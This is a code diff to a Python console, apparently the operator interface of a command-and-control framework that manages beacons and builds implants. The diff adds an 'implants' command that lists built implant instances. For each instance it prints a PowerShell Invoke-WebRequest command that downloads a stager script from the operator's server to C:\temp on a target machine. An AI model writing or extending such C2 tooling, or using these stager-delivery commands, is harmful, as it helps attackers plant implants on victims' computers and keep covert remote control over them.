@@ -773,6 +773,7 @@ class C4Console(App):
                 "  [cyan]interact <name|id>[/]   — start session with a beacon\n"
                 "  [cyan]alias <id> <name>[/]    — set a beacon alias\n"
                 "  [cyan]tools[/]                — show available beacon tools\n"
+                "  [cyan]implants[/]             — list available implant instances\n"
                 "  [cyan]build [options][/]       — build a new implant instance\n"
                 "  [cyan]back[/]                 — exit current session\n"
                 "  [cyan]quit[/]                 — exit console\n"
@@ -798,6 +799,8 @@ class C4Console(App):
                 self._log("[red]Usage: alias <id|hostname> <new_alias>[/]")
                 return
             self._set_alias(parts[1], parts[2])
+        elif cmd == "implants":
+            self._list_implants()
         elif cmd == "build":
             self._build_implant(raw)
         elif cmd == "back":
@@ -955,6 +958,33 @@ class C4Console(App):
         beacon.alias = alias
         self._log(f"[green]Aliased[/] {old} → [bold]{alias}[/]")
         self.refresh_beacons()
+
+    # -- List implants ---------------------------------------------------
+
+    def _list_implants(self) -> None:
+        implants_dir = _C4_DIR / "implants"
+        if not implants_dir.is_dir():
+            self._log("[dim]No implants directory found.[/]")
+            return
+        dirs = sorted(
+            (d for d in implants_dir.iterdir() if d.is_dir()),
+            key=lambda d: d.stat().st_mtime,
+            reverse=True,
+        )
+        if not dirs:
+            self._log("[dim]No implant instances found.[/]")
+            return
+        self._log(f"\n[bold green]Available implants ({len(dirs)}):[/]")
+        for d in dirs:
+            files = sorted(f.name for f in d.iterdir() if f.is_file())
+            self._log(f"  [cyan]{d.name}[/]")
+            if _SERVE_DIR and hasattr(self, "_local_ip"):
+                self._log(
+                    f"    [dim]Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
+                    f"/serve/{d.name}/rc_stager_full.ps1 -OutFile C:\\temp\\stager.ps1[/]"
+                )
+            self._log(f"    [dim]files: {', '.join(files)}[/]")
+        self._log("")
 
     # -- Build implant ---------------------------------------------------
 
